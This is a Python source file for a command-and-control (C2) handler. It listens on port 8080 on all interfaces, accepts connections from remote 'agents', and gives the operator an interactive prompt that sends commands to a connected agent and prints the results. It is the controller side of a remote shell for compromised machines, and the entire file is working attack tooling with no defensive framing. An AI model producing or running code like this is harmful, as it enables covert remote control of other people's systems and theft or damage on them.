# handler.py
import socket
import sys
import os

# Add parent directory to path to ensure utils can be imported
base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(base_dir)

from utils.comms import send_msg, recv_msg

class Handler:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server = None

    def start(self):
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            print(f"[*] C2 Handler listening on {self.host}:{self.port}")

            while True:
                client_socket, address = self.server.accept()
                print(f"[*] New connection from {address}")
                self.interactive_shell(client_socket)
        except Exception as e:
            print(f"[!] Error starting handler: {e}")
        finally:
            if self.server:
                self.server.close()

    def interactive_shell(self, client_socket):
        print("[*] Entering interactive shell. Type 'exit' to disconnect agent.")
        while True:
            try:
                command = input("C2> ").strip()
                if not command:
                    continue
                
                if command.lower() == "exit":
                    client_socket.close()
                    print("[*] Connection closed.")
                    break
                
                # Send command using protocol
                send_msg(client_socket, command)
                
                # Receive response using protocol
                response_data = recv_msg(client_socket)
                if response_data is None:
                    print("[!] Agent disconnected.")
                    break
                
                print(response_data.decode())
            except Exception as e:
                print(f"[!] Error in interactive session: {e}")
                break
        client_socket.close()

if __name__ == "__main__":
    handler = Handler("0.0.0.0", 8080)
    handler.start()